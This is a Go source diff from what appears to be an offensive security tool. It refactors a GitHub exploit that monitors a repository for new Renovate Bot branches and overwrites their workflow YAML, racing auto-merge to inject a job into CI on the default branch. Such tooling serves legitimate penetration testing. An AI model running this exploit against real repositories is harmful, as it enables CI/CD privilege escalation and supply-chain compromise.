@@ -3,10 +3,10 @@ package renovate
 import (
 	"context"
 	"fmt"
-	"regexp"
 	"strings"
 	"time"
 
+	pkgrenovate "github.com/CompassSecurity/pipeleek/pkg/renovate"
 	"github.com/google/go-github/v69/github"
 	"github.com/rs/zerolog/log"
 	"gopkg.in/yaml.v3"
@@ -29,7 +29,8 @@ func RunExploit(client *github.Client, repoName, renovateBranchesRegex string) {
 		log.Fatal().Stack().Err(err).Str("repoName", repoName).Msg("Unable to retrieve repository information")
 	}
 
-	regex, err := regexp.Compile(renovateBranchesRegex)
+	// Create branch monitor
+	branchMonitor, err := pkgrenovate.NewBranchMonitor(renovateBranchesRegex)
 	if err != nil {
 		log.Fatal().Stack().Err(err).Msg("The provided renovate-branches-regex is invalid")
 	}
@@ -48,7 +49,7 @@ func RunExploit(client *github.Client, repoName, renovateBranchesRegex string) {
 	checkDefaultBranchProtections(ctx, client, repository)
 
 	log.Info().Msg("Monitoring for new Renovate Bot branches to exploit")
-	branch := monitorBranches(ctx, client, repository, regex)
+	branch := monitorBranches(ctx, client, repository, branchMonitor)
 
 	log.Info().Str("branch", branch.GetName()).Msg("Fetching workflow from Renovate branch")
 	workflowContent := getBranchWorkflow(ctx, client, repository, branch)
@@ -66,8 +67,8 @@ func RunExploit(client *github.Client, repoName, renovateBranchesRegex string) {
 
 	updateWorkflowYml(ctx, client, repository, branch, workflowContent)
 
-	log.Info().Str("branch", branch.GetName()).Msg("Workflow configuration updated, check if we won the race!")
-	log.Info().Msg("If Renovate automatically merges the branch, you have successfully exploited the privilege escalation vulnerability and injected a job into the workflow that runs on the default branch")
+	// Log shared exploit instructions
+	pkgrenovate.LogExploitInstructions(branch.GetName(), repository.GetDefaultBranch())
 	listBranchPRs(ctx, client, repository, branch)
 }
 
@@ -93,11 +94,11 @@ func checkDefaultBranchProtections(ctx context.Context, client *github.Client, r
 	}
 }
 
-func monitorBranches(ctx context.Context, client *github.Client, repo *github.Repository, regex *regexp.Regexp) *github.Branch {
+func monitorBranches(ctx context.Context, client *github.Client, repo *github.Repository, branchMonitor *pkgrenovate.BranchMonitor) *github.Branch {
 	owner := repo.GetOwner().GetLogin()
 	repoName := repo.GetName()
 
-	originalBranches := make(map[string]bool)
+	isFirstScan := true
 
 	for {
 		log.Debug().Msg("Checking for new branches created by Renovate Bot")
@@ -110,34 +111,26 @@ func monitorBranches(ctx context.Context, client *github.Client, repo *github.Re
 
 		if err != nil {
 			log.Error().Err(err).Msg("Failed to list branches, retrying ...")
-			time.Sleep(5 * time.Second)
+			time.Sleep(pkgrenovate.GetRetryInterval())
 			continue
 		}
 
-		if len(originalBranches) == 0 {
+		if isFirstScan {
 			log.Debug().Msg("Storing original branches for comparison")
-			for _, b := range branches {
-				originalBranches[b.GetName()] = true
-			}
-
-			if len(originalBranches) == 100 {
+			if len(branches) == 100 {
 				log.Warn().Msg("More than 100 branches found, new branches might not be detected")
 			}
 		}
 
 		for _, branch := range branches {
-			if _, exists := originalBranches[branch.GetName()]; exists {
-				continue
-			}
-
-			log.Info().Str("branch", branch.GetName()).Msg("Checking if new branch matches Renovate Bot regex")
-			if regex.MatchString(branch.GetName()) {
-				log.Info().Str("branch", branch.GetName()).Msg("Identified Renovate Bot branch, starting exploit process")
+			if branchMonitor.CheckBranch(branch.GetName(), isFirstScan) {
+				log.Info().Str("branch", branch.GetName()).Msg("Starting exploit process")
 				return branch
 			}
 		}
 
-		time.Sleep(10 * time.Second)
+		isFirstScan = false
+		time.Sleep(pkgrenovate.GetMonitoringInterval())
 	}
 }
 
